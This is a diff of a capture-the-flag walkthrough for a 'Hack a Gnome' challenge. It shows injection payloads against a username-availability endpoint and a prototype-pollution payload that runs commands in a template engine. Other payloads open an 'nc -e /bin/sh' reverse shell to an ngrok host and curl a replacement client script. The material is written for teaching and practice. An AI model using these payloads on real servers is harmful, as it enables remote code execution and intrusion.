@@ -62,13 +62,6 @@ On the register page, when we put the username, we see /userAvailable endpoint w
 If username is available, Its new user.<br/>
 If username is not available, Its existing user.
 
-| UI | Request | Response |
-|----------|----------|----------|
-| Text A   | Text B   | Text C   |
-| ![Img1](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_1.png) | ![Img2](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_2.png) | ![Img3](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_3.png) |
-
-![Img1](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_1.png)<br/>
-![Img1](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_2.png)<br/>
 ![Img1](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_3.png)
 
 So we brute force with common names. <br/>
@@ -111,7 +104,7 @@ in the {placeholder}<br/>
 payload ```bruce" AND IS_DEFINED(c.{placeholder}) -- '``` <br/>
 URL encoded ```bruce%22%20AND%20IS_DEFINED(c.{placeholder})%20--%20%27```<br/>
 
-Every single one of then responded with ```{"available":true}``` except "cipher" responded with ```{"available":false}```<br/>
+Every single one of then responded with ```{"available":true}``` except **"cipher"** responded with ```{"available":false}```<br/>
 
 payload ```bruce" AND IS_DEFINED(c.cipher) -- '``` <br/>
 URL encoded ```bruce%22%20AND%20IS_DEFINED(c.cipher)%20--%20%27```<br/>
@@ -213,14 +206,14 @@ The update action updates the name.
 The update is reflected in the /stats page
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_13.png)
 
-There was a hint indicating protype pollution in the stats page which uses a template.
+There was a hint indicating **protype pollution** in the stats page which uses a template.
 ??? quote "Prototype pollution hint"
     A backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats.
     .....
     During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down.
 
   
-Rubén Santos García has an awesome blog post on [Prototype pollution] https://www.kayssel.com/newsletter/issue-24/ with a section specifically dedicated to RCE on template engine using prototype pollution.
+Rubén Santos García has an awesome blog post on [Prototype pollution](https://www.kayssel.com/newsletter/issue-24/) with a section specifically dedicated to RCE on template engine using prototype pollution.
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_14.png)
 
 ```
@@ -251,8 +244,8 @@ We send the below URL encoded version to the endpoint /ctrlsignals?message=
 We are now able to save the value.
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_15.png)
 
-Now that the template is saved, browsing the /stats page will render the template and will execute that commend.<br/>
-We can see ```root`` as the output of ```whoami``` in the request.
+Now that the template is saved, browsing the ```/stats``` page will render the template and will execute that commend.<br/>
+We can see ```root``` as the output of ```whoami``` in the request.
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_16.png)
 
 Saving the request with ```ls``` and then browsing the /stats page shows the file listing.<br/>
@@ -264,7 +257,7 @@ We can then get a reverse shell.
 Set up ngrok on tcp and local netcat to get the reverse shell.
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_18.png)
 
-We update the above payload with the reverse shell payload.
+We update the above payload with the reverse shell payload. <br/>
 So now when the code executes, the app server would call ngrok which would spawn a reverse shell on the netcat on the local kalibox.
 ``` 
 {"action":"update", "key":"__proto__", "subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(nc -e /bin/sh 4.tcp.ngrok.io 11012)');test2"}
@@ -286,9 +279,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_21.png)
 
 There are two important files in the remote server - canbus_client.py and README.md.<br/>
-canbus_client.py has the mapping of the keystrokes [up, down, left, right] with the CAN IDs.
+canbus_client.py has the mapping of the keystrokes [up, down, left, right] with the CAN IDs.<br/>
 The mapping, however is not correct.
-canbus_client.py<br/>
+
 ??? tip "canbus_client.py"
     ```py title="canbus_client.py"
         #!/usr/bin/python3
@@ -596,66 +589,66 @@ canbus_client.py<br/>
 
 ??? tip "README.md"
     
-    GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!
-    Ho ho hold on there! Welcome to the inner workings of the GnomeBot's communication system. This marvelous contraption uses the **CAN (Controller Area Network)** bus to chatter away about its status and sometimes even listen to requests. It's like the reindeer telegraph, but with more wires and less sneezing.
+        GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!
+        Ho ho hold on there! Welcome to the inner workings of the GnomeBot's communication system. This marvelous contraption uses the **CAN (Controller Area Network)** bus to chatter away about its status and sometimes even listen to requests. It's like the reindeer telegraph, but with more wires and less sneezing.
 
-    This document details the known signals whizzing around on the `gcan0` interface. Remember, all multi-byte values are sent **Big Endian** (Most Significant Byte first), just like how Santa lists the nicest kids first!
+        This document details the known signals whizzing around on the `gcan0` interface. Remember, all multi-byte values are sent **Big Endian** (Most Significant Byte first), just like how Santa lists the nicest kids first!
 
-    ---
+        ---
 
-    ## 🎁 CAN Data Requests (Client -> GnomeBot )
+        ## 🎁 CAN Data Requests (Client -> GnomeBot )
 
-    Sometimes, you need to poke the GnomeBot to get specific information *right now*. Send one of these messages, and the  *should* reply with the corresponding Status/Data message (see below).
+        Sometimes, you need to poke the GnomeBot to get specific information *right now*. Send one of these messages, and the  *should* reply with the corresponding Status/Data message (see below).
 
-    | CAN ID (Hex) | Constant Name             | Description                                      | Data Sent |
-    | :----------- | :------------------------ | :----------------------------------------------- | :-------- |
-    | `0x400`      | `requestBatteryVoltageID` | Asks for the current battery voltage reading.    | (Empty)   |
-    | `0x470`      | `requestGPSFixID`         | Inquires about the current GPS fix status.       | (Empty)   |
-    | `0x410`      | `requestMotorSpeedLeftID` | Requests the current speed of the left motor.    | (Empty)   |
-    | `0x460`      | `requestSystemTempID`     | Asks for the GnomeBot's internal temperature.    | (Empty)   |
-    | `0x4C0`      | `requestPayloadStatusID`  | Requests the current status of the payload/gripper. | (Empty)   |
+        | CAN ID (Hex) | Constant Name             | Description                                      | Data Sent |
+        | :----------- | :------------------------ | :----------------------------------------------- | :-------- |
+        | `0x400`      | `requestBatteryVoltageID` | Asks for the current battery voltage reading.    | (Empty)   |
+        | `0x470`      | `requestGPSFixID`         | Inquires about the current GPS fix status.       | (Empty)   |
+        | `0x410`      | `requestMotorSpeedLeftID` | Requests the current speed of the left motor.    | (Empty)   |
+        | `0x460`      | `requestSystemTempID`     | Asks for the GnomeBot's internal temperature.    | (Empty)   |
+        | `0x4C0`      | `requestPayloadStatusID`  | Requests the current status of the payload/gripper. | (Empty)   |
 
-    ---
+        ---
 
-    ## ✨ CAN Status & Data Responses (GnomeBot  -> Client)
+        ## ✨ CAN Status & Data Responses (GnomeBot  -> Client)
 
-    These messages are the GnomeBot  telling the world (or at least the CAN bus) what's going on. Some are sent automatically like clockwork (Periodic), some only when asked (Response Only), and some do both!
+        These messages are the GnomeBot  telling the world (or at least the CAN bus) what's going on. Some are sent automatically like clockwork (Periodic), some only when asked (Response Only), and some do both!
 
-    | CAN ID (Hex) | Constant Name                | Behavior              | Data Bytes | Data Type        | Description & Units/Meaning                                                                 |
-    | :----------- | :--------------------------- | :-------------------- | :--------- | :--------------- | :------------------------------------------------------------------------------------------ |
-    | `0x300`      | `statusBatteryVoltageID`     | Response Only         | 2          | `uint16`         | Battery voltage in **millivolts (mV)**. E.g., `0x30D4` = 12500mV = 12.5V.                     |
-    | `0x310`      | `statusMotorSpeedLeftID`     | Periodic + Response   | 2          | `int16`          | Left motor speed in **RPM**. Can be negative for reverse!                                   |
-    | `0x311`      | `statusMotorSpeedRightID`    | Periodic              | 2          | `int16`          | Right motor speed in **RPM**.                                                               |
-    | `0x320`      | `statusSonarDistanceFrontID` | Periodic              | 2          | `uint16`         | Front sonar distance reading in **centimeters (cm)**.                                       |
-    | `0x321`      | `statusSonarDistanceRearID`  | Periodic              | 2          | `uint16`         | Rear sonar distance reading in **centimeters (cm)**.                                        |
-    | `0x330`      | `statusIMUDataID`            | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Simple sequence/second counter. Byte 1: Status flags (e.g., `0x01` = OK).     |
-    | `0x340`      | `statusHeadlightID`          | Periodic              | 1          | `uint8`          | Headlight status: `0x00` = Off, `0x01` = On. Is it Rudolph's spare nose?                  |
-    | `0x350`      | `statusWifiStatusID`         | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: WiFi Signal Strength (0-100%). Byte 1: Status (`0`=Disc, `1`=Conn).           |
-    | `0x351`      | `statusBluetoothStatusID`    | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Number of paired devices. Byte 1: Status (`0`=Off, `1`=On, `2`=Paired).          |
-    | `0x360`      | `statusSystemTempID`         | Periodic + Response   | 1          | `int8`           | Internal system temperature in **degrees Celsius (°C)**. Keep it cool, like the North Pole! |
-    | `0x370`      | `statusGPSFixID`             | Response Only         | 1          | `uint8`          | GPS Fix Status: `0` = No Fix, `1` = 2D Fix, `2` = 3D Fix.                                 |
-    | `0x380`      | `statusWheelOdomLeftID`      | Periodic              | 4          | `uint32`         | Cumulative left wheel odometry ticks. Rollin' towards Christmas!                           |
-    | `0x381`      | `statusWheelOdomRightID`     | Periodic              | 4          | `uint32`         | Cumulative right wheel odometry ticks.                                                     |
-    | `0x390`      | `statusAmbientLightID`       | Periodic              | 2          | `uint16`         | Ambient light sensor reading in **Lux**. Brighter than Rudolph's nose?                      |
-    | `0x391`      | `statusHumidityID`           | Periodic              | 1          | `uint8`          | Relative humidity percentage (%). Is it snowing?                                          |
-    | `0x392`      | `statusPressureID`           | Periodic              | 4          | `uint32`         | Barometric pressure in **Pascals (Pa)**.                                                  |
-    | `0x3A0`      | `statusCurrentDrawID`        | Periodic              | 2          | `int16`          | Main battery current draw in **milliamps (mA)**. How much juice does this thing use?!   |
-    | `0x3B0`      | `statusEstopStatusID`        | Periodic              | 1          | `uint8`          | Emergency Stop Status: `0x00` = OK, `0x01` = PRESSED! (Hopefully not!)                    |
-    | `0x3C0`      | `statusPayloadStatusID`      | Periodic + Response   | 1          | `uint8` (Bitmap) | Payload Status: Bit 0 (`0x01`): Gripper Open, Bit 1 (`0x02`): Sensor Active.        |
-    | `0x3D0`      | `statusNavStatusID`          | Periodic              | 1          | `uint8`          | Navigation System Status: `0`=Idle, `1`=Navigating, `2`=Reached, `3`=Failed.          |
-    | `0x3E0`      | `statusFanSpeedID`           | Periodic              | 1          | `uint8`          | Cooling fan speed percentage (%). Keeping the circuits frosty.                          |
-    | `0x3FF`      | `statusHeartbeatID`          | Periodic              | 1          | `uint8`          | Heartbeat counter. Increments with each message. Lub-dub, lub-dub... is it alive?!      |
+        | CAN ID (Hex) | Constant Name                | Behavior              | Data Bytes | Data Type        | Description & Units/Meaning                                                                 |
+        | :----------- | :--------------------------- | :-------------------- | :--------- | :--------------- | :------------------------------------------------------------------------------------------ |
+        | `0x300`      | `statusBatteryVoltageID`     | Response Only         | 2          | `uint16`         | Battery voltage in **millivolts (mV)**. E.g., `0x30D4` = 12500mV = 12.5V.                     |
+        | `0x310`      | `statusMotorSpeedLeftID`     | Periodic + Response   | 2          | `int16`          | Left motor speed in **RPM**. Can be negative for reverse!                                   |
+        | `0x311`      | `statusMotorSpeedRightID`    | Periodic              | 2          | `int16`          | Right motor speed in **RPM**.                                                               |
+        | `0x320`      | `statusSonarDistanceFrontID` | Periodic              | 2          | `uint16`         | Front sonar distance reading in **centimeters (cm)**.                                       |
+        | `0x321`      | `statusSonarDistanceRearID`  | Periodic              | 2          | `uint16`         | Rear sonar distance reading in **centimeters (cm)**.                                        |
+        | `0x330`      | `statusIMUDataID`            | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Simple sequence/second counter. Byte 1: Status flags (e.g., `0x01` = OK).     |
+        | `0x340`      | `statusHeadlightID`          | Periodic              | 1          | `uint8`          | Headlight status: `0x00` = Off, `0x01` = On. Is it Rudolph's spare nose?                  |
+        | `0x350`      | `statusWifiStatusID`         | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: WiFi Signal Strength (0-100%). Byte 1: Status (`0`=Disc, `1`=Conn).           |
+        | `0x351`      | `statusBluetoothStatusID`    | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Number of paired devices. Byte 1: Status (`0`=Off, `1`=On, `2`=Paired).          |
+        | `0x360`      | `statusSystemTempID`         | Periodic + Response   | 1          | `int8`           | Internal system temperature in **degrees Celsius (°C)**. Keep it cool, like the North Pole! |
+        | `0x370`      | `statusGPSFixID`             | Response Only         | 1          | `uint8`          | GPS Fix Status: `0` = No Fix, `1` = 2D Fix, `2` = 3D Fix.                                 |
+        | `0x380`      | `statusWheelOdomLeftID`      | Periodic              | 4          | `uint32`         | Cumulative left wheel odometry ticks. Rollin' towards Christmas!                           |
+        | `0x381`      | `statusWheelOdomRightID`     | Periodic              | 4          | `uint32`         | Cumulative right wheel odometry ticks.                                                     |
+        | `0x390`      | `statusAmbientLightID`       | Periodic              | 2          | `uint16`         | Ambient light sensor reading in **Lux**. Brighter than Rudolph's nose?                      |
+        | `0x391`      | `statusHumidityID`           | Periodic              | 1          | `uint8`          | Relative humidity percentage (%). Is it snowing?                                          |
+        | `0x392`      | `statusPressureID`           | Periodic              | 4          | `uint32`         | Barometric pressure in **Pascals (Pa)**.                                                  |
+        | `0x3A0`      | `statusCurrentDrawID`        | Periodic              | 2          | `int16`          | Main battery current draw in **milliamps (mA)**. How much juice does this thing use?!   |
+        | `0x3B0`      | `statusEstopStatusID`        | Periodic              | 1          | `uint8`          | Emergency Stop Status: `0x00` = OK, `0x01` = PRESSED! (Hopefully not!)                    |
+        | `0x3C0`      | `statusPayloadStatusID`      | Periodic + Response   | 1          | `uint8` (Bitmap) | Payload Status: Bit 0 (`0x01`): Gripper Open, Bit 1 (`0x02`): Sensor Active.        |
+        | `0x3D0`      | `statusNavStatusID`          | Periodic              | 1          | `uint8`          | Navigation System Status: `0`=Idle, `1`=Navigating, `2`=Reached, `3`=Failed.          |
+        | `0x3E0`      | `statusFanSpeedID`           | Periodic              | 1          | `uint8`          | Cooling fan speed percentage (%). Keeping the circuits frosty.                          |
+        | `0x3FF`      | `statusHeartbeatID`          | Periodic              | 1          | `uint8`          | Heartbeat counter. Increments with each message. Lub-dub, lub-dub... is it alive?!      |
 
-    ---
+        ---
 
-    ## 🛠️ Movement Commands & Acknowledgments (Client <-> GnomeBot )
+        ## 🛠️ Movement Commands & Acknowledgments (Client <-> GnomeBot )
 
-    ```
-    TODO: There are more signals related to controlling the GnomeBot's movement
-    (Up/Down/Left/Right) and the acknowledgments sent back by the bot.
-    These involve CAN IDs that are not totally settled yet. We are still polishing
-    the documentation for these - check back after eggnog break!
-    ```
+        ```
+        TODO: There are more signals related to controlling the GnomeBot's movement
+        (Up/Down/Left/Right) and the acknowledgments sent back by the bot.
+        These involve CAN IDs that are not totally settled yet. We are still polishing
+        the documentation for these - check back after eggnog break!
+        ```
 
 Now, the current canbus_client.py does not have the right command map to move the gnome, 
 we will need to brute force the hex values for the command map. <br/>
@@ -674,8 +667,8 @@ python -m http.server 80
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_26.png)
 
 
-we use the below payload with the /ctrlsignals endpoint.<br/>
-This would get the canbus_client.py from the URL https://transsepulchral-towardly-jazmin.ngrok-free.dev/canbus_client.py which then would get the URL from out local directory where the local python wer server is running.
+we use the below payload with the ```/ctrlsignals``` endpoint.<br/>
+This would get the canbus_client.py from the URL ```https://transsepulchral-towardly-jazmin.ngrok-free.dev/canbus_client.py``` which then would get the URL from out local directory where the local python wer server is running.
 
 ```
 {"action":"update", "key":"__proto__", "subkey":"outputFunctionName", "value":"test1;process.mainModule.require('child_process').execSync('$(curl https://transsepulchral-towardly-jazmin.ngrok-free.dev/canbus_client.py -o canbus_client.py)');test2"}
@@ -945,7 +938,7 @@ We try with below map and the gnome moves in all directions. <br/>
     ```
 
 The gnome moves now. <br/>
-We can move it to rach the lever on the top left to complete the chalenge.
+We can move it to rach the lever on the top left to complete the challenge.
 ![Hack-a-genome](../img/objectives/Hack_a_Gnome/Hack_a_Gnome_29.png)
 
 
@@ -954,6 +947,5 @@ We can move it to rach the lever on the top left to complete the chalenge.
 
 ## Response
 !!! quote "Chris Davis"
-   Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.<br/>
-
+    Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.<br/>
     Time to turn this little rebel against its own manufacturing operation and shut them down for good!
